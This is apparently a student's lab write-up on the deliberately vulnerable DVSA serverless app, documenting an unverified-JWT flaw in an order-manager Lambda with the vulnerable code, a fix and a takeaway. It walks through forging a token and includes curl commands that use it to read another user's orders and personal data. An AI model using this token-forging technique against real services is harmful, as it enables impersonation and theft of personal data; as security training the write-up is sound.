# Lesson 2 — Broken Authentication (JWT Signature Not Verified)

**Student:** Ibrahim Alshayea  
**Vulnerability class:** Broken Authentication  
**Affected component:** `DVSA-ORDER-MANAGER` Lambda — `order-manager.js`  
**Endpoint:** `POST /dvsa/order`

---

## Summary

The Lambda reads `username` and `sub` directly from the base64-decoded JWT payload without
ever verifying the signature against the Cognito JWKS. A logged-in user (User B) can therefore
edit their token's payload to point at another user (User C), keep the original invalid signature,
and the server accepts it — returning User C's full order details including name, address,
and phone number.

**Impact:** Any authenticated user can impersonate any other user and read their orders and PII.

---

## Root Cause

```js
// order-manager.js — VULNERABLE
const tokenPayload = Buffer.from(token.split('.')[1], 'base64').toString();
const decoded = JSON.parse(tokenPayload);
const username = decoded.username;   // trusted without signature check
const userId   = decoded.sub;
```

A JWT has three parts: `header.payload.signature`. The backend only decodes the middle part
and trusts it as identity. It never calls a JWKS endpoint to verify that the signature is valid.

---

## Reproduction Steps

### Prerequisites
- Two DVSA accounts: **User B** (attacker) and **User C** (victim)
- Both users must have placed at least one order

### Step 1 — Capture both tokens
Log in as each user and copy the `authorization` header from any `/dvsa/order` request in
DevTools.

```bash
export API="https://<id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
export TOKEN_B="<user-b-jwt>"
export TOKEN_C="<user-c-jwt>"
```

### Step 2 — Decode both tokens to get User C's sub
```bash
python3 exploit/decode_tokens.py
```

Output:
```
TOKEN_B  username: 4408a468-... sub: 4408a468-...
TOKEN_C  username: 04b884e8-... sub: 04b884e8-...
```

```bash
export VICTIM_USER="04b884e8-10b1-70cd-9957-e00a95755c6e"
```

### Step 3 — Forge a token
```bash
export FAKE_AS_C="$(python3 exploit/forge_token.py)"
echo "Forged token length: ${#FAKE_AS_C}"
```

### Step 4 — Confirm normal behavior (User B sees only their own orders)
```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw '{"action":"orders"}' | jq
```

### Step 5 — Use the forged token to get User C's orders
```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $FAKE_AS_C" \
  --data-raw '{"action":"orders"}' | jq
```

The response will contain User C's order ID — different from User B's.

### Step 6 — Get User C's full order details
```bash
export ORDER_C="<order-id-from-step-5>"
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $FAKE_AS_C" \
  --data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_C\"}" | jq
```

Response includes User C's `name`, `address`, `phone`, and `email`.

---

## Evidence

Screenshots to place in `screenshots/`:
- `2.1-baseline-user-b-orders.png` — User B's real token returns only User B's orders
- `2.2-forged-token-user-c-orders.png` — Forged token returns User C's order list
- `2.3-forged-token-user-c-full-details.png` — Forged token returns User C's full PII
- `2.4-cloudformation-outputs.png` — DVSA deployed in us-east-1

---

## Fix

**File:** `DVSA-ORDER-MANAGER / order-manager.js`

Replace the decode-and-trust pattern with a full JWKS-based signature verification:

```js
// AFTER (safe) — see fix/jwt-verification.js for the full implementation
const claims = await verifyCognitoJwt(authHeader, region, userPoolId);
const username = claims.username;
const userId   = claims.sub;
```

The `verifyCognitoJwt` function (see `fix/jwt-verification.js`):
1. Fetches the Cognito JWKS public keys
2. Verifies the JWT signature using `node-jose`
3. Validates `iss`, `exp`, and `token_use` claims
4. Only then extracts `username`/`sub`

If verification fails, it returns 401 and logs the reason to CloudWatch.

---

## Verification

Re-run the forged-token curl from Step 5. The response should be:
```json
{ "message": "Invalid token" }
```

A real `TOKEN_B` should still return only User B's orders correctly.

---

## Takeaway

Decoding a JWT is not the same as verifying it. Anyone can decode a JWT — the signature is
what makes it trustworthy. Every Lambda that accepts a JWT must verify the signature against
the identity provider's JWKS before trusting any claim inside it.
